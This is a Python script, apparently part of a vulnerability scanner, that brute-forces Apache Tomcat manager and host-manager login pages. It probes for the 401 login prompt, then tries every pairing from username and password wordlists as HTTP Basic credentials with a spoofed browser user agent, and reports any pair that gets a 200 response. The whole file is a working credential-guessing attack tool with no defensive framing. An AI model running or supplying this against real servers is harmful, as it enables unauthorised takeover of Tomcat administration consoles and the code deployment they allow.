import requests 
import time 
import base64 
import os 
import sys
from config.config_requests import headers
username=[]
password=[]
names=open('dict/username.txt','r') 
for name in names: 
    name=name.rstrip() 
    username.append(name)
   
passwds=open('dict/password.txt','r') 
for passwd in passwds: 
    passwd=passwd.rstrip() 
    password.append(passwd)


def islive(url,port):
    if int(port)==8443 or int(port)==443 :
        url1="https://"+str(url)+":"+str(port)+"/host-manager/html"
    else:
        url1="http://"+str(url)+":"+str(port)+"/host-manager/html"
    try:
        r=requests.get(url1,headers=headers,verify=False,timeout=0.5)
        if r.status_code==401:
            return 1
    except Exception:
        pass
def islive2(url,port):
    if int(port)==8443 or int(port)==443 :
        url1="https://"+str(url)+":"+str(port)+"/manager/html"
    else:
        url1="http://"+str(url)+":"+str(port)+"/manager/html"
    try:
        r=requests.get(url1,headers=headers,verify=False,timeout=0.5)
        if r.status_code==401:
            return 1
    except Exception:
        pass

def run(url,port):
    try:
        state=0
        if islive(url,port)==1:
            if int(port)==8443 or int(port)==443 :
                url1="https://"+str(url)+":"+str(port)+"/host-manager/html"
            else:
                url1="http://"+str(url)+":"+str(port)+"/host-manager/html"
            vurl=str(url)+":"+str(port)
            print('[-] Start brute force password cracking on the target: {}'.format(vurl))
            for line in username:
                for line2 in password:
                    pass1=line+":"+line2
                    bytes = base64.b64encode(pass1.encode('utf-8'))
                    bs64_pass = bytes.decode('utf-8')
                    headers1 = {
                        'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
                        'Authorization': 'Basic {}'.format(bs64_pass)
                    }
                    res = requests.get(url=url1, headers=headers1)
                    if res.status_code == 200:
                        state=1
                        return(1,'[+] Tomcat weakpass find!{} {}'.format(vurl,pass1))
                        break
            if state == 0:
                return (0,'[-] {} semms no weakpass'.format(vurl))
        elif islive2(url,port)==1:
            if int(port)==8443 or int(port)==443 :
                url1="https://"+str(url)+":"+str(port)+"/manager/html"
            else:
                url1="http://"+str(url)+":"+str(port)+"/manager/html"
            vurl=str(url)+":"+str(port)
            print('[-] Start brute force password cracking on the target: {}'.format(vurl))
            for line in username:
                for line2 in password:
                    pass1=line+":"+line2
                    bytes = base64.b64encode(pass1.encode('utf-8'))
                    bs64_pass = bytes.decode('utf-8')
                    headers1 = {
                        'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
                        'Authorization': 'Basic {}'.format(bs64_pass)
                    }
                    print('Basic {}'.format(bs64_pass))
                    res = requests.get(url=url1, headers=headers1)
                    print(res.status_code)
                    if res.status_code == 200:
                        state=1
                        return(1,'[+] Tomcat weakpass find!{} {}'.format(vurl,pass1))
                        break
            if state == 0:
                return (0,'[-] {} semms no weakpass'.format(vurl))            
    except Exception:
        return (0,'[-] {} semms no weakpass'.format(vurl))



if __name__=="__main__":
    url = sys.argv[1]
    port = int(sys.argv[2])
    run(url,port)